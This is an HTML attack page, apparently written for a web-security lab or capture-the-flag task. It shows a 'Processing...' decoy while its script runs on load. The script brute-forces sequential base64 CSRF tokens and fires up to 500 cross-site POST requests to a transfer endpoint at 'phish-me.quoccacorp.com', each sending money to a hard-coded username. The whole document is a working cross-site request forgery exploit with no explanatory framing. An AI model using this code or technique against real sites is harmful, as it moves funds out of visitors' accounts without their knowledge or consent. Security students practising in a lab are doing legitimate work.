<!DOCTYPE html>
<html>
<head>
    <title>Transferring Funds...</title>
</head>
<body>
    <script>
        const targetUrl = "https://phish-me.quoccacorp.com/api/transfer";
        const myUsername = "z5462057";
        const amount = "100"; 

        const start = 20021;
        const range = 500; 

        async function bruteForceCSRF() {
            for (let i = start; i < start + range; i++) {
                const token = btoa(i.toString()); 
                
                const formData = new URLSearchParams();
                formData.append('username', myUsername);
                formData.append('amount', amount);
                formData.append('csrf_token', token);

                fetch(targetUrl, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: formData,
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    }
                });
            }
        }

        bruteForceCSRF();
    </script>
    <h2>Processing...</h2>
</body>
</html>
